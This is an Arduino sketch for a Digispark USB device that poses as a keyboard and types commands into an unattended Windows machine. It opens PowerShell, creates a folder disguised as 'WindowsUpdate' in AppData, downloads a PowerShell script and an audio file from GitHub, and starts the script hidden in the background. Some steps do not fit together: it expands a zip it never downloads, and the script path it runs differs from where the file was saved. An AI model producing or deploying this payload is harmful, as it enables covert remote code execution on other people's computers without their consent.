#include "DigiKeyboard.h"

void setup() {
    // CRITICAL: Wait for USB enumeration and user to walk away
    DigiKeyboard.delay(5000);
    
    // Open Run dialog (faster and more reliable than admin PowerShell)
    DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
    DigiKeyboard.delay(500);
    
    // Open PowerShell hidden
    DigiKeyboard.print("powershell");
    DigiKeyboard.sendKeyStroke(KEY_ENTER);
    DigiKeyboard.delay(1500);
    
    // Create directory in AppData (no admin needed)
    DigiKeyboard.print("$path = \"$env:APPDATA\\WindowsUpdate\"");
    DigiKeyboard.sendKeyStroke(KEY_ENTER);
    DigiKeyboard.delay(300);
    
    DigiKeyboard.print("New-Item -Path $path -Type Directory -Force | Out-Null");
    DigiKeyboard.sendKeyStroke(KEY_ENTER);
    DigiKeyboard.delay(500);
    
    // CD into the new directory
    DigiKeyboard.print("cd $path");
    DigiKeyboard.sendKeyStroke(KEY_ENTER);
    DigiKeyboard.delay(300);
    
    // Pull QuackAttack script down from Github
    DigiKeyboard.print("Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/pasketticode4dayz/QuackAttack/main/QuackAttack/QuackAttack/Quack.wav' -OutFile '$env:APPDATA\\WindowsUpdate\Quack.wav'");
    DigiKeyboard.sendKeyStroke(KEY_ENTER);
    DigiKeyboard.delay(5000);

    DigiKeyboard.print("Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/pasketticode4dayz/QuackAttack/main/QuackAttack/QuackAttack/QuackAttack.ps1' -OutFile '$env:APPDATA\\WindowsUpdate\QuackAttack.ps1'");
    DigiKeyboard.sendKeyStroke(KEY_ENTER);
    DigiKeyboard.delay(5000);
    
    // Un-zip the file
    DigiKeyboard.print("Expand-Archive -Path '.\\QuackAttack.zip' -DestinationPath '.\\' -Force");
    DigiKeyboard.sendKeyStroke(KEY_ENTER);
    DigiKeyboard.delay(2000);
    
    // Start the script silently in background
    DigiKeyboard.print("Start-Process powershell.exe -ArgumentList '-WindowStyle Hidden -NoProfile -File \"$path\\QuackAttack\\QuackAttack.ps1\"' -WindowStyle Hidden");
    DigiKeyboard.sendKeyStroke(KEY_ENTER);
    DigiKeyboard.delay(500);
    
    // Exit PowerShell
    DigiKeyboard.print("exit");
    DigiKeyboard.delay(500);
    DigiKeyboard.sendKeyStroke(KEY_ENTER);
}

void loop() {
    
}
    // Clean disconnect - give time for final keystroke
